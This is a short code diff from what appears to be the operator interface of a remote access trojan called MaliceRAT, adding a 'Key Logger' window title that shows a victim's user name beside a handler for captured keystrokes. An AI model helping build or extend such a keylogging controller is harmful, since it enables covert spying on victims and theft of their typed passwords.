@@ -15,6 +15,8 @@ namespace MaliceRAT.RatUI
             this.server = server;
 
             server.keyLogger.OnKeystrokeReceived += OnKeystrokeReceived;
+
+            titleLabel.Text = $"Key Logger [{server.GetVictimById(victimId).User}]";
         }
 
         private void OnKeystrokeReceived(Victim victim, string keystroke)
